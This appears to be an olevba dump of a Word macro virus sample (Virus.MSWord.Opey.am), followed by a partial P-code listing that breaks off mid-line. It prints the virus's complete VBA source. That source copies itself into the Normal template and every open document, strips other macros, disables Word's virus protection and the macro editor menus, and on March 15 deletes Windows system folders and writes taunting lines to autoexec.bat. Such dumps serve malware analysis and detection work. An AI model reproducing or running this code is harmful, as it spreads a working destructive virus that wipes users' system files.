olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Opey.am
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Opey.am - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cyberbug.bas 
in file: Virus.MSWord.Opey.am - OLE stream: 'Macros/VBA/cyberbug'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Success As Boolean
Public Sub DelTree32(DrvLtr As String, DeleteDIR As String)
Dim Result As String
Dim W As Integer
Dim X As Integer
Dim Y As Integer
Dim Z As Integer
Dim DIRList() As String
Dim FileList() As String
W = 0
Y = 0
Success = False
On Error Resume Next
ChDrive DrvLtr
If Not Err = 0 Then Exit Sub
ChDir (DrvLtr & "\" & DeleteDIR)
If Not Err = 0 Then Exit Sub
ChDrive DrvLtr
RmDir ("\" & DeleteDIR)
If Err = 0 Then
    On Error GoTo 0
    Success = True
    Exit Sub
Else
    Result = Dir((DrvLtr & "\" & DeleteDIR & "\*.*"), vbDirectory)
    Do
    If (Result = "." Or Result = "..") = False Then
        Exit Do
    Else
        Result = Dir()
    End If
    Loop
    Do
    If Result = "" Then Exit Do
    If (GetAttr(DrvLtr & "\" & DeleteDIR & "\" & Result)) = vbDirectory Then
        W = W + 1
        ReDim Preserve DIRList(W)
        DIRList(W) = Result
    Else
        Y = Y + 1
        ReDim Preserve FileList(Y)
        FileList(Y) = Result
    End If
    Result = Dir()
    Loop
    For X = 1 To W
        Call DelTree32(DrvLtr, (DeleteDIR & "\" & DIRList(X)))
        If Success = False Then Exit Sub
    Next X
    For Z = 1 To Y
        Kill (DrvLtr & "\" & DeleteDIR & "\" & FileList(Z))
    Next Z
    ChDrive DrvLtr
    RmDir ("\" & DeleteDIR)
    Success = True
    On Error GoTo 0
End If
End Sub

Public Sub XCopy32(SourceDrv As String, SourceDIR As String, DestDrv As String, Optional DestDIR As String)
Dim Result As String
Dim W As Integer
Dim X As Integer
Dim Y As Integer
Dim Z As Integer
Dim DIRList() As String
Dim FileList() As String
W = 0
Y = 0
Success = False
On Error Resume Next
ChDrive SourceDrv
If Not Err = 0 Then Exit Sub
ChDir (SourceDrv & "\" & SourceDIR)
If Not Err = 0 Then Exit Sub
ChDrive DestDrv
If Not Err = 0 Then Exit Sub
ChDir (DestDrv & "\" & DestDIR)
If Not Err = 0 Then
    Err = 0
    MkDir (DestDrv & "\" & DestDIR)
    If Not Err = 0 Then Exit Sub
End If
On Error GoTo 0
Result = Dir((SourceDrv & "\" & SourceDIR & "\*.*"), vbDirectory)
Do
If (Result = "." Or Result = "..") = False Then
    Exit Do
Else
    Result = Dir()
End If
Loop
Do
If Result = "" Then Exit Do
If (GetAttr(SourceDrv & "\" & SourceDIR & "\" & Result)) = vbDirectory Then
    W = W + 1
    ReDim Preserve DIRList(W)
    DIRList(W) = Result
Else
    Y = Y + 1
    ReDim Preserve FileList(Y)
    FileList(Y) = Result
End If
Result = Dir()
Loop
For X = 1 To W
    Call XCopy32(SourceDrv, (SourceDIR & "\" & DIRList(X)), DestDrv, (DestDIR & "\" & DIRList(X)))
    If Success = False Then Exit Sub
Next X
For Z = 1 To Y
    FileCopy (SourceDrv & "\" & SourceDIR & "\" & FileList(Z)), (DestDrv & "\" & DestDIR & "\" & FileList(Z))
Next Z
Success = True
End Sub
Sub greetings()
    On Error Resume Next
        autoexecfile$ = "c:\autoexec.bat"
        hFile = FreeFile
        line1$ = ""
        line2$ = "echo I think your system just crashed !!!!!"
            If (Month(Date) = 3) And (Day(Date) = 15) Then
                line1$ = "echo It's MICO's Birthday and he has a gift for you .."
                Call DelTree32("c:", "windows\system")
                Call DelTree32("c:", "windows\command")
                End If
                      
            If line1$ <> "" Then
                    Open autoexecfile$ For Append Access Write As hFile
                        Print #hFile, "@echo off"
                        Print #hFile, line1$
                        Print #hFile, "echo  hahahahahahaha !!!!!"
                        Print #hFile, line2$
                        Print #hFile, "echo from: CYBER"
                        Print #hFile, "pause"
                    Close hFile
                End If
End Sub
Sub OnlyYou()
  On Error Resume Next
    Call cyberbug
    NTInfected = False
        For I = NormalTemplate.VBProject.VBComponents.Count To 1 Step -1
            clan = NormalTemplate.VBProject.VBComponents(I).Name
                If clan = "cyberbug" Then NTInfected = True
                If (clan <> "cyberbug") And (clan <> "ThisDocument") Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
        Next I
        For Each opendoc In Documents
            ODInfected = False
            With opendoc
                For J = opendoc.VBProject.VBComponents.Count To 1 Step -1
                clan = opendoc.VBProject.VBComponents(J).Name
                    If clan = "cyberbug" Then ODInfected = True
                    If (clan <> "cyberbug") And (clan <> "ThisDocument") And (clan <> "Reference to Normal") Then Application.OrganizerDelete Source:=opendoc.FullName, Name:=clan, Object:=wdOrganizerObjectProjectItems
                Next J
                If ODInfected = False Then
                    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=opendoc.FullName, Name:="cyberbug", Object:=wdOrganizerObjectProjectItems
                End If
            End With
        Next opendoc
            If NTInfected = False Then
                Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="cyberbug", Object:=wdOrganizerObjectProjectItems
                NormalTemplate.Save
            End If
    Call greetings
End Sub
Sub cyberbug()
    On Error Resume Next
    Application.UserName = "CYBER"
    Application.UserAddress = "INTERNATIONAL GROUP OF HACKERS (IGH)"
    Application.UserInitials = "CYBERBUG"
    With Dialogs(wdDialogFileSummaryInfo)
        .Author = "CYBER"
        .Title = "Document"
        .Execute
    End With
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    On Error Resume Next
    CommandBars("Visual Basic").Visible = False
    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    CommandBars("Tools").Controls("Macro").Delete
    CommandBars("Tools").Controls("Customize...").Delete
    CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
End Sub
Sub Cyber()
Application.DisplayAlerts = wdAlertsNone
End Sub
Sub FileSave()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub FileExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub FileNew()
    On Error Resume Next
    Dialogs(wdDialogFileNew).Show
    Call OnlyYou
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoExec()
    On Error Resume Next
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FilePageSetup()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePageSetup).Show
End Sub
Sub FilePrint()
    On Error Resume Next
    Call OnlyYou
    Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call OnlyYou
    ActiveDocument.Save
End Sub
Sub AutoClose()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub AutoExit()
    On Error Resume Next
    Call OnlyYou
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Opey.am
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/cyberbug - 13169 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Success (As Boolean)
' Line #1:
' 	FuncDefn (Public Sub DelTree32(DrvLtr As String, DeleteDIR As String))
' Line #2:
' 	Dim 
' 	VarDefn Result (As String)
' Line #3:
' 	Dim 
' 	VarDefn W (As Integer)
' Line #4:
' 	Dim 
' 	VarDefn X (As Integer)
' Line #5:
' 	Dim 
' 	VarDefn Y (As Integer)
' Line #6:
' 	Dim 
' 	VarDefn Z (As Integer)
' Line #7:
' 	Dim 
' 	VarDefn DIRList (As String)
' Line #8:
' 	Dim 
' 	VarDefn FileList (As String)
' Line #9:
' 	LitDI2 0x0000 
' 	St W 
' Line #10:
' 	LitDI2 0x0000 
' 	St Y 
' Line #11:
' 	LitVarSpecial (False)
' 	St Success 
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' 	Ld DrvLtr 
' 	ArgsCall ChDrive 0x0001 
' Line #14:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #15:
' 	Ld DrvLtr 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DeleteDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #16:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #17:
' 	Ld DrvLtr 
' 	ArgsCall ChDrive 0x0001 
' Line #18:
' 	LitStr 0x0001 "\"
' 	Ld DeleteDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall RmDir 0x0001 
' Line #19:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	OnError (GoTo 0) 
' Line #21:
' 	LitVarSpecial (True)
' 	St Success 
' Line #22:
' 	ExitSub 
' Line #23:
' 	ElseBlock 
' Line #24:
' 	Ld DrvLtr 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DeleteDIR 
' 	Concat 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	Paren 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Result 
' Line #25:
' 	Do 
' Line #26:
' 	Ld Result 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Ld Result 
' 	LitStr 0x0002 ".."
' 	Eq 
' 	Or 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #27:
' 	ExitDo 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	ArgsLd Dir 0x0000 
' 	St Result 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Loop 
' Line #32:
' 	Do 
' Line #33:
' 	Ld Result 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #34:
' 	Ld DrvLtr 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DeleteDIR 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Result 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld W 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #36:
' 	OptionBase 
' 	Ld W 
' 	Redim (Preserve) DIRList 0x0001 (As Variant)
' Line #37:
' 	Ld Result 
' 	Ld W 
' 	ArgsSt DIRList 0x0001 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Add 
' 	St Y 
' Line #40:
' 	OptionBase 
' 	Ld Y 
' 	Redim (Preserve) FileList 0x0001 (As Variant)
' Line #41:
' 	Ld Result 
' 	Ld Y 
' 	ArgsSt FileList 0x0001 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	ArgsLd Dir 0x0000 
' 	St Result 
' Line #44:
' 	Loop 
' Line #45:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #46:
' 	Ld DrvLtr 
' 	Ld DeleteDIR 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld X 
' 	ArgsLd DIRList 0x0001 
' 	Concat 
' 	Paren 
' 	ArgsCall (Call) DelTree32 0x0002 
' Line #47:
' 	Ld Success 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #48:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #49:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Y 
' 	For 
' Line #50:
' 	Ld DrvLtr 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DeleteDIR 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Z 
' 	ArgsLd FileList 0x0001 
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #51:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	Ld DrvLtr 
' 	ArgsCall ChDrive 0x0001 
' Line #53:
' 	LitStr 0x0001 "\"
' 	Ld DeleteDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall RmDir 0x0001 
' Line #54:
' 	LitVarSpecial (True)
' 	St Success 
' Line #55:
' 	OnError (GoTo 0) 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Public Sub XCopy32(SourceDrv As String, SourceDIR As String, DestDrv As String, Optional DestDIR As String))
' Line #60:
' 	Dim 
' 	VarDefn Result (As String)
' Line #61:
' 	Dim 
' 	VarDefn W (As Integer)
' Line #62:
' 	Dim 
' 	VarDefn X (As Integer)
' Line #63:
' 	Dim 
' 	VarDefn Y (As Integer)
' Line #64:
' 	Dim 
' 	VarDefn Z (As Integer)
' Line #65:
' 	Dim 
' 	VarDefn DIRList (As String)
' Line #66:
' 	Dim 
' 	VarDefn FileList (As String)
' Line #67:
' 	LitDI2 0x0000 
' 	St W 
' Line #68:
' 	LitDI2 0x0000 
' 	St Y 
' Line #69:
' 	LitVarSpecial (False)
' 	St Success 
' Line #70:
' 	OnError (Resume Next) 
' Line #71:
' 	Ld SourceDrv 
' 	ArgsCall ChDrive 0x0001 
' Line #72:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #73:
' 	Ld SourceDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SourceDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #74:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #75:
' 	Ld DestDrv 
' 	ArgsCall ChDrive 0x0001 
' Line #76:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #77:
' 	Ld DestDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DestDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall ChDir 0x0001 
' Line #78:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0000 
' 	St Err 
' Line #80:
' 	Ld DestDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DestDIR 
' 	Concat 
' 	Paren 
' 	ArgsCall MkDir 0x0001 
' Line #81:
' 	Ld Err 
' 	LitDI2 0x0000 
' 	Eq 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	OnError (GoTo 0) 
' Line #84:
' 	Ld SourceDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SourceDIR 
' 	Concat 
' 	LitStr 0x0004 "\*.*"
' 	Concat 
' 	Paren 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Result 
' Line #85:
' 	Do 
' Line #86:
' 	Ld Result 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Ld Result 
' 	LitStr 0x0002 ".."
' 	Eq 
' 	Or 
' 	Paren 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #87:
' 	ExitDo 
' Line #88:
' 	ElseBlock 
' Line #89:
' 	ArgsLd Dir 0x0000 
' 	St Result 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Loop 
' Line #92:
' 	Do 
' Line #93:
' 	Ld Result 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #94:
' 	Ld SourceDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SourceDIR 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Result 
' 	Concat 
' 	ArgsLd GetAttr 0x0001 
' 	Paren 
' 	Ld vbDirectory 
' 	Eq 
' 	IfBlock 
' Line #95:
' 	Ld W 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #96:
' 	OptionBase 
' 	Ld W 
' 	Redim (Preserve) DIRList 0x0001 (As Variant)
' Line #97:
' 	Ld Result 
' 	Ld W 
' 	ArgsSt DIRList 0x0001 
' Line #98:
' 	ElseBlock 
' Line #99:
' 	Ld Y 
' 	LitDI2 0x0001 
' 	Add 
' 	St Y 
' Line #100:
' 	OptionBase 
' 	Ld Y 
' 	Redim (Preserve) FileList 0x0001 (As Variant)
' Line #101:
' 	Ld Result 
' 	Ld Y 
' 	ArgsSt FileList 0x0001 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	ArgsLd Dir 0x0000 
' 	St Result 
' Line #104:
' 	Loop 
' Line #105:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #106:
' 	Ld SourceDrv 
' 	Ld SourceDIR 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld X 
' 	ArgsLd DIRList 0x0001 
' 	Concat 
' 	Paren 
' 	Ld DestDrv 
' 	Ld DestDIR 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld X 
' 	ArgsLd DIRList 0x0001 
' 	Concat 
' 	Paren 
' 	ArgsCall (Call) XCopy32 0x0004 
' Line #107:
' 	Ld Success 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #108:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #109:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Y 
' 	For 
' Line #110:
' 	Ld SourceDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld SourceDIR 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Z 
' 	ArgsLd FileList 0x0001 
' 	Concat 
' 	Paren 
' 	Ld DestDrv 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld DestDIR 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Z 
' 	ArgsLd FileList 0x0001 
' 	Concat 
' 	Paren 
' 	ArgsCall FileCopy 0x0002 
' Line #111:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #112:
' 	LitVarSpecial (True)
' 	St Success 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Sub greetings())
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	St autoexecfile$ 
' Line #117:
' 	Ld Friend 
' 	St hFile 
' Line #118:
' 	LitStr 0x0000 ""
' 	St line1$ 
' Line #119:
' 	LitStr 0x002B "echo I think your system just crashed !!!!!"
' 	St line2$ 
' Line #120:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #121:
' 	LitStr 0x0036 "echo It's MICO's Birthday and he has a gift for you .."
' 	St line1$ 
' Line #122:
' 	LitStr 0x0002 "c:"
' 	LitStr 0x000E "windows\system"
' 	ArgsCall (Call) DelTree32 0x0002 
' Line #123:
' 	LitStr 0x0002 "c:"
' 	LitStr 0x000F "windows\command"
' 	ArgsCall (Call) DelTree32 0x0002 
' Line #124:
' 	EndIfBlock 
' Line #125:
' Line #126:
' 	Ld line1$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #127:
' 	Ld autoexecfile$ 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Append Access Write)
' Line #128:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #129:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line1$ 
' 	PrintItemNL 
' Line #130:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo  hahahahahahaha !!!!!"
' 	PrintItemNL 
' Line #131:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld line2$ 
' 	PrintItemNL 
' Line #132:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "echo from: CYBER"
' 	PrintItemNL 
' Line #133:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #134:
' 	Ld hFile 
' 	Close 0x0001 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub OnlyYou())
' Line #138:
' 	OnError (Resume Next) 
' Line #139:
' 	ArgsCall (Call) cyberbug 0x0000 
' Line #140:
' 	LitVarSpecial (False)
' 	St NTInfected 
' Line #141:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #142:
' 	Ld I 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #143:
' 	Ld clan 
' 	LitStr 0x0008 "cyberbug"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NTInfected 
' 	EndIf 
' Line #144:
' 	Ld clan 
' 	LitStr 0x0008 "cyberbug"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #145:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #146:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #147:
' 	LitVarSpecial (False)
' 	St ODInfected 
' Line #148:
' 	StartWithExpr 
' 	Ld opendoc 
' 	With 
' Line #149:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #150:
' 	Ld J 
' 	Ld opendoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St clan 
' Line #151:
' 	Ld clan 
' 	LitStr 0x0008 "cyberbug"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ODInfected 
' 	EndIf 
' Line #152:
' 	Ld clan 
' 	LitStr 0x0008 "cyberbug"
' 	Ne 
' 	Paren 
' 	Ld clan 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld clan 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld clan 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' 	EndIf 
' Line #153:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	Ld ODInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #155:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld opendoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "cyberbug"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndWith 
' Line #158:
' 	StartForVariable 
' 	Ld opendoc 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	Ld NTInfected 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #160:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0008 "cyberbug"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #161:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	ArgsCall (Call) greetings 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' 	FuncDefn (Sub cyberbug())
' Line #166:
' 	OnError (Resume Next) 
' Line #167:
' 	LitStr 0x0005 "CYBER"
' 	Ld Application 
' 	MemSt UserName 
' Line #168:
' 	LitStr 0x0024 "INTERNATIONAL GROUP OF HACKERS (IGH)"
' 	Ld Application 
' 	MemSt UserAddress 
' Line #169:
' 	LitStr 0x0008 "CYBERBUG"
' 	Ld Application 
' 	MemSt UserInitials 
' Line #170:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #171:
' 	LitStr 0x0005 "CYBER"
' 	MemStWith Author 
' Line #172:
' 	LitStr 0x0008 "Document"
' 	MemStWith Title 
' Line #173:
' 	ArgsMemCallWith Execute 0x0000 
' Line #174:
' 	EndWith 
' Line #175:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #176:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #177:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #178:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #179:
' 	EndWith 
' Line #180:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #181:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #182:
' 	EndWith 
' Line #183:
' 	OnError (Resume Next) 
' Line #184:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #185:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #186:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #187:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #188:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #189:
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #190:
' 	LitStr 0x0018 "Templates and Add-Ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #191:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #192:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
